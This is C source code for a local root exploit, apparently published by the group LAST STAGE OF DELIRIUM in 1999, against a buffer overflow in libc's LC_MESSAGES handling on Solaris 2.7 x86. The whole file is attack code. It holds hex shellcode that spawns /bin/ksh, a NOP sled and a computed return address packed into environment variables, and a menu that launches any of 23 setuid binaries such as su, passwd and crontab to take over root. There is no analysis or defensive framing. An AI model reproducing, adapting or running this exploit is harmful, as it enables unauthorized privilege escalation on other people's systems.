/*## copyright LAST STAGE OF DELIRIUM aug 1999 poland        *://lsd-pl.net/ #*/
/*## libc.so $LC_MESSAGES                                                    #*/

#define NOPNUM 4000
#define ADRNUM 4000

char shellcode[]=
    "\xeb\x1b"             /* jmp     <shellcode+30>       */
    "\x33\xd2"             /* xorl    %edx,%edx            */
    "\x58"                 /* popl    %eax                 */
    "\x8d\x78\x14"         /* leal    0x14(%eax),edi       */
    "\x52"                 /* pushl   %edx                 */
    "\x57"                 /* pushl   %edi                 */
    "\x50"                 /* pushl   %eax                 */
    "\xab"                 /* stosl   %eax,%es:(%edi)      */
    "\x92"                 /* xchgl   %eax,%edx            */
    "\xab"                 /* stosl   %eax,%es:(%edi)      */
    "\x88\x42\x08"         /* movb    %al,0x8(%edx)        */
    "\x83\xef\x3c"         /* subl    $0x3c,%edi           */
    "\xb0\x9a"             /* movb    $0x9a,%al            */
    "\xab"                 /* stosl   %eax,%es:(%edi)      */
    "\x47"                 /* incl    %edi                 */
    "\xb0\x07"             /* movb    $0x7,%al             */
    "\xab"                 /* stosl   %eax,%es:(%edi)      */
    "\xb0\x3b"             /* movb    $0x3b,%al            */
    "\xe8\xe0\xff\xff\xff" /* call    <shellcode+2>        */
    "/bin/ksh"
;

char jump[]=
    "\x8b\xc4"             /* movl    %esp,%eax            */
    "\xc3"                 /* ret                          */
;

main(int argc,char **argv){
    char buffer[10000],adr[4],*b,*envp[3];
    int i,n=-1;

    printf("copyright LAST STAGE OF DELIRIUM aug 1999 poland  //lsd-pl.net/\n");
    printf("libc.so $LC_MESSAGES for solaris 2.7 x86\n\n");

    if(argc!=2){
        printf("usage: %s {list_devices|deallocate|traceroute|mkdevmaps|"
            "mkdevalloc|allocate|volrmmount|volcheck|nispasswd|yppasswd|"
            "su|rcp|fdformat|eject|crontab|atrm|atq|at|ufsdump|netpr|rlogin|"
            "passwd|rsh}\n",argv[0]);
        exit(-1);
    }
    if(!strcmp(argv[1],"list_devices")) n=0;
    if(!strcmp(argv[1],"deallocate")) n=1;
    if(!strcmp(argv[1],"traceroute")) n=2;
    if(!strcmp(argv[1],"mkdevmaps")) n=3;
    if(!strcmp(argv[1],"mkdevalloc")) n=4;
    if(!strcmp(argv[1],"allocate")) n=5;
    if(!strcmp(argv[1],"volrmmount")) n=6;
    if(!strcmp(argv[1],"volcheck")) n=7;
    if(!strcmp(argv[1],"nispasswd")) n=8;
    if(!strcmp(argv[1],"yppasswd")) n=9;
    if(!strcmp(argv[1],"su")) n=10;
    if(!strcmp(argv[1],"rcp")) n=11;
    if(!strcmp(argv[1],"fdformat")) n=12;
    if(!strcmp(argv[1],"eject")) n=13;
    if(!strcmp(argv[1],"crontab")) n=14;
    if(!strcmp(argv[1],"atrm")) n=15;
    if(!strcmp(argv[1],"atq")) n=16;
    if(!strcmp(argv[1],"at")) n=17;
    if(!strcmp(argv[1],"ufsdump")) n=18;
    if(!strcmp(argv[1],"netpr")) n=19;
    if(!strcmp(argv[1],"rlogin")) n=20;
    if(!strcmp(argv[1],"passwd")) n=21;
    if(!strcmp(argv[1],"rsh")) n=22;
    if(n==-1) exit(-1);

    *((unsigned long*)adr)=(*(unsigned long(*)())jump)()+2812+2000;

    envp[0]=&buffer[0];
    envp[1]=&buffer[5000];
    envp[2]=0;

    b=&buffer[0];
    sprintf(b,"xxx=");
    b+=4;
    for(i=0;i<NOPNUM;i++) *b++=0x90;
    for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i]; 
    *b=0;

    b=&buffer[5000];
    sprintf(b,"LC_MESSAGES=");
    b+=12;
    for(i=0;i<ADRNUM;i++) *b++=adr[i%4];
    *b=0;

    switch(n){
    case 0: execle("/usr/sbin/list_devices","lsd",0,envp);
    case 1: execle("/usr/sbin/deallocate","lsd",0,envp);
    case 2: execle("/usr/sbin/traceroute","lsd",0,envp);
    case 3: execle("/usr/sbin/mkdevmaps","lsd",0,envp);
    case 4: execle("/usr/sbin/mkdevalloc","lsd",0,envp);
    case 5: execle("/usr/sbin/allocate","lsd",0,envp);
    case 6: execle("/usr/bin/volrmmount","lsd",0,envp);
    case 7: execle("/usr/bin/volcheck","lsd",0,envp);
    case 8: execle("/usr/bin/nispasswd","lsd",0,envp);
    case 9: execle("/usr/bin/yppasswd","lsd",0,envp);
    case 10: execle("/usr/bin/su","lsd",0,envp);
    case 11: execle("/usr/bin/rcp","lsd",0,envp);
    case 12: execle("/usr/bin/fdformat","lsd",0,envp);
    case 13: execle("/usr/bin/eject","lsd",0,envp);
    case 14: execle("/usr/bin/crontab","lsd",0,envp);
    case 15: execle("/usr/bin/atrm","lsd",0,envp);
    case 16: execle("/usr/bin/atq","lsd",0,envp);
    case 17: execle("/usr/bin/at","lsd",0,envp);
    case 18: execle("/usr/lib/fs/ufs/ufsdump","lsd",0,envp);
    case 19: execle("/usr/lib/lp/bin/netpr","lsd",0,envp);
    case 20: execle("/usr/bin/rlogin","lsd",0,envp);
    case 21: execle("/bin/passwd","lsd",0,envp);
    case 22: execle("/bin/rsh","lsd",0,envp);
    }
}

